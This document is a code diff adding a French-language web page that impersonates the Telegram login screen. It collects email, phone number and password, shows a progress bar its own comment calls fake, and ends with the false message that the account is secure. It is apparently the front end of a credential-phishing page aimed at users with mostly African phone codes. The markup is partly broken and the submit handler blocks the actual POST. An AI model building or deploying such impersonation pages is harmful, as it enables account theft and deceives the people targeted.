@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Connexion Telegram</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f5f5f5;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
+            color: #222;
+        }
+        .login-container {
+            background: #ffffff;
+            border: 1px solid #ddd;
+            padding: 30px 40px;
+            border-radius: 10px;
+            box-shadow: 0 2px 15px rgba(0,0,0,0.1);
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+        }
+        img {
+            width: 80px;
+            margin-bottom: 20px;
+        }
+        h2 {
+            margin-bottom: 25px;
+            font-weight: 600;
+            color: #0088cc;
+        }
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+        input[type="text"],
+        input[type="tel"],
+        input[type="email"],
+        input[type="password"],
+        select {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ccc;
+            border-radius: 7px;
+            font-size: 1em;
+            box-sizing: border-box;
+        }
+        .phone-input {
+            display: flex;
+            gap: 10px;
+        }
+        .country-code {
+            flex: 0 0 90px;
+        }
+        .phone-number {
+            flex: 1;
+        }
+        .remember-me {
+            display: flex;
+            align-items: center;
+            margin: 15px 0;
+        }
+        .remember-me input {
+            margin-right: 10px;
+            accent-color: #0088cc;
+        }
+        button {
+            background-color: #0088cc;
+            color: white;
+            border: none;
+            padding: 14px;
+            width: 100%;
+            border-radius: 7px;
+            font-size: 1.1em;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            margin-top: 10px;
+        }
+        button:hover {
+            background-color: #006699;
+        }
+        .progress-container {
+            margin-top: 20px;
+            display: none;
+        }
+        .progress-bar {
+            width: 100%;
+            background: #ddd;
+            border-radius: 5px;
+            overflow: hidden;
+        }
+        .progress-bar-fill {
+            height: 20px;
+            background: #0088cc;
+            width: 0%;
+            color: #fff;
+            text-align: center;
+            line-height: 20px;
+            transition: width 0.2s;
+        }
+        .final-message {
+            display: none;
+            margin-top: 20px;
+        }
+        .final-message p {
+            font-size: 1.1em;
+            color: #22863a;
+            margin-bottom: 15px;
+        }
+        .confirm-btn {
+            background-color: #0088cc;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 7px;
+            font-size: 1em;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Logo Telegram" />
+    <h2 id="form-title">Connexion Telegram</h2>
+    <form id="loginForm" method="POST" action="login.php" autocomplete="off">
+        <div class="form-group">
+            <label for="username">Email</label>
+            <input type="email" id="username" name="username" placeholder="Votre email" required autocomplete="username">
+        </div>
+        <div class="form-group">
+            <label>Numéro de téléphone</label>
+            <div class="phone-input">
+                <select id="country-code" name="country_code" class="country-code" required>
+                    <option value="+243">🇨🇩 +243</option>
+                    <option value="+237">🇨🇲 +237</option>
+                    <option value="+228">🇹🇬 +228</option>
+                    <option value="+242">🇨🇬 +242</option>
+                    <option value="+501">🇧🇿 +501</option>
+                    <option value="+224">🇬🇳 +224</option>
+                    <option value="+207">🇪🇬 +207</option>
+                    <option value="+33">🇫🇷 +33</option>
+                </select>
+                <input type="tel" id="phone-number" name="phone_number" class="phone-number" placeholder="Numéro" required autocomplete="tel">
+            </div>
+        </div>
+        <div class="form-group">
+            <label for="password">Mot de passe</label>
+            <input type="password" id="password" name="password" placeholder="Mot de passe" required autocomplete="current-password">
+        </div>
+        <div class="remember-me">
+            <input type="checkbox" id="remember" name="remember" checked>
+            <label for="remember">Garder ma session active</label>
+        </div>
+        <button type="submit" id="submit-btn">Continuer</button>
+    </form>
+   <div class="loading" id="loading">Chargement</div>
+        <div class="message" id="message"></div>
+    </form>
+
+    <!-- la fausse barre de chargement -->
+    <div class="progress-container" id="progress-container">
+        <div class="progress-bar">
+            <div class="progress-bar-fill" id="progress-fill">0%</div>
+        </div>
+    </div>
+
+    <div class="final-message" id="final-message">
+        <p>Votre compte est en sécurité.</p>
+        <button class="confirm-btn" onclick="location.reload()">Confirmer</button>
+    </div>
+
+</div>
+
+<script>
+    const loginForm = document.getElementById('loginForm');
+    const message = document.getElementById('message');
+    const loading = document.getElementById('loading');
+    const submitBtn = document.getElementById('submit-btn');
+    const progressContainer = document.getElementById('progress-container');
+    const progressFill = document.getElementById('progress-fill');
+    const finalMessage = document.getElementById('final-message');
+
+    loginForm.addEventListener('submit', function(event) {
+        event.preventDefault();
+        loginForm.style.display = 'none';
+        progressContainer.style.display = 'block';
+
+        let progress = 0;
+        const interval = setInterval(() => {
+            progress += Math.floor(Math.random() * 10) + 5;
+            if (progress >= 100) {
+                progress = 100;
+                clearInterval(interval);
+                progressContainer.style.display = 'none';
+                finalMessage.style.display = 'block';
+            }
+            progressFill.style.width = progress + '%';
+            progressFill.textContent = progress + '%';
+        }, 300);
+    });
+</script>
+
+</body>
+</html>
